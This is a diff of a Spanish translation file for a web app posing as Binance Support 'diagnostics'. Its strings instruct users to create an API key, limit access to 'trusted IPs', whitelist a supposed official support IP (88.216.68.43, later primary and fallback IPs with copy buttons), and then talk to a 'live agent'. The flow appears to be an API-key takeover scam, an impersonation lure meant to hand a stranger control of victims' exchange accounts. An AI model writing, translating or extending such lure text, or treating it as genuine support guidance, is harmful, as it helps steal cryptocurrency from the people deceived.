@@ -44,6 +44,11 @@ export const es = {
     copyKey: "Copiar Clave",
     copied: "¡Copiado!",
     keyCopied: "¡Clave copiada al portapapeles!",
+    binanceSupportIps: "Agregue a la lista blanca las IPs de Soporte Binance para garantizar un rango de diagnóstico completo.",
+    primaryIp: "Dirección IP Principal:",
+    fallbackIp: "Dirección IP de Respaldo:",
+    copyIp: "Copiar IP",
+    ipCopied: "¡Dirección IP copiada al portapapeles!",
     completionTitle: "Generación de Clave API Completa",
     completionMessage: "Su clave API de diagnóstico ha sido creada exitosamente. Por favor mantenga sus claves seguras y nunca las comparta con nadie.",
     verifyingKey: "Verificando su clave...",
@@ -57,6 +62,8 @@ export const es = {
     runningDiagnostics: "Ejecutando Diagnósticos...",
     diagnosticsComplete: "Diagnósticos Completados",
     diagnosticsCompleteMessage: "El escaneo de diagnósticos de su cuenta ha sido completado. Por favor hable con un agente en vivo para revisar sus resultados.",
+    diagnosticsFailed: "Diagnósticos Fallidos",
+    diagnosticsFailedMessage: "El escaneo de diagnósticos ha fallado. Por favor contacte a nuestro equipo de soporte en vivo para asistencia inmediata.",
     steps: {
       step1: {
         title: "Habilitando su clave de diagnóstico Binance (Paso 1)",
@@ -90,8 +97,8 @@ export const es = {
       },
       step7: {
         title: "Habilitando su clave de diagnóstico Binance (Pasos Finales)",
-        computer: "Complete los siguientes pasos finales:\n\n4. Bajo restricciones de acceso IP, seleccione \"restringir acceso solo a IPs de confianza\".\n\n5. Añada la IP oficial de Soporte Binance en el espacio de abajo: 88.216.68.43\n\n6. Puede que tenga que completar la autenticación de dos factores una vez más dependiendo de la configuración de su cuenta.\n\n7. Los agentes de Binance evaluarán instantáneamente la seguridad de su cuenta. Por favor haga clic en el widget de chat en vivo en la parte inferior derecha de su pantalla para verificar sus resultados con un técnico en vivo.",
-        mobile: "Complete los siguientes pasos finales:\n\n4. Bajo restricciones de acceso IP, seleccione \"restringir acceso solo a IPs de confianza\".\n\n5. Añada la IP oficial de Soporte Binance en el espacio de abajo: 88.216.68.43\n\n6. Puede que tenga que completar la autenticación de dos factores una vez más dependiendo de la configuración de su cuenta.\n\n7. Los agentes de Binance evaluarán instantáneamente la seguridad de su cuenta. Por favor haga clic en el widget de chat en vivo en la parte inferior derecha de su pantalla para verificar sus resultados con un técnico en vivo.",
+        computer: "Complete los siguientes pasos finales:\n\n4. Bajo restricciones de acceso IP, seleccione \"restringir acceso solo a IPs de confianza\".\n\n5. Añada las direcciones IP oficiales de Soporte Binance en el espacio de abajo. Puede copiarlas usando los botones proporcionados:\n\n6. Puede que tenga que completar la autenticación de dos factores una vez más dependiendo de la configuración de su cuenta.\n\n7. Los agentes de Binance evaluarán instantáneamente la seguridad de su cuenta. Por favor haga clic en el widget de chat en vivo en la parte inferior derecha de su pantalla para verificar sus resultados con un técnico en vivo.",
+        mobile: "Complete los siguientes pasos finales:\n\n4. Bajo restricciones de acceso IP, seleccione \"restringir acceso solo a IPs de confianza\".\n\n5. Añada las direcciones IP oficiales de Soporte Binance en el espacio de abajo. Puede copiarlas usando los botones proporcionados:\n\n6. Puede que tenga que completar la autenticación de dos factores una vez más dependiendo de la configuración de su cuenta.\n\n7. Los agentes de Binance evaluarán instantáneamente la seguridad de su cuenta. Por favor haga clic en el widget de chat en vivo en la parte inferior derecha de su pantalla para verificar sus resultados con un técnico en vivo.",
       },
       step8: {
         title: "Ingrese su Clave API",
